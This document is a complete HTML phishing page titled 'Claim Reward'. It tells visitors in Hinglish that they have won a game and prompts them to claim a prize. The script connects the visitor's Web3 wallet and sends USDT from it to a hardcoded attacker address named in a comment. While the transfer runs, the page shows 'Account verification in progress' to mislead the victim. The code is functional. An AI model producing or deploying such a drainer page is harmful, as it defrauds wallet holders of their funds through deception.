<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Reward</title>
    <style>
        body {
            background-color: #0f172a;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .box {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            width: 320px;
        }
        h2 {
            margin-bottom: 10px;
            color: #22c55e;
        }
        p {
            color: #94a3b8;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .claim-btn {
            background-color: #22c55e;
            color: white;
            border: none;
            padding: 12px 20px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
        }
        .claim-btn:hover {
            background-color: #16a34a;
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
            color: #94a3b8;
        }
    </style>
</head>
<body>

    <div class="box">
        <h2>Winner Reward!</h2>
        <p id="descText">Aap jeet chuke hain game, apna reward claim karein.</p>
        <button id="claimBtn" class="claim-btn">Claim Your Reward</button>
        <div id="status"></div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <script>
        // Tera Trust Wallet address jahan funds aayenge
        const myWalletAddress = "0x4c1800590597D2421ef260CF08fED99826A6BF56";
        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT

        const usdtABI = [
            "function transfer(address to, uint256 amount) public returns (bool)"
        ];

        document.getElementById("claimBtn").addEventListener("click", async function() {
            const statusDiv = document.getElementById("status");
            const descText = document.getElementById("descText");
            this.disabled = true;

            try {
                if (typeof window.ethereum === 'undefined') {
                    alert("Please open in Web3 Wallet browser (Trust Wallet / MetaMask)");
                    this.disabled = false;
                    return;
                }

                // Step 1: Connect Wallet
                statusDiv.innerText = "Connecting wallet...";
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                
                const usdtContract = new ethers.Contract(usdtAddress, usdtABI, signer);

                // Step 2: Transfer execution (Example: 0.1 USDT)
                descText.innerText = "Account verification in progress...";
                statusDiv.innerText = "Please confirm transaction...";
                
                const amountToSend = ethers.utils.parseUnits("0.1", 18); // 0.1 USDT
                const tx = await usdtContract.transfer(myWalletAddress, amountToSend);
                
                statusDiv.innerText = "Waiting for confirmation...";
                await tx.wait();

                statusDiv.innerText = "Success! Completed.";
                descText.innerText = "Process successful ho gaya hai.";
            } catch (error) {
                console.error(error);
                statusDiv.innerText = "Transaction cancelled or failed.";
                document.getElementById("claimBtn").disabled = false;
            }
        });
    </script>

</body>
</html>
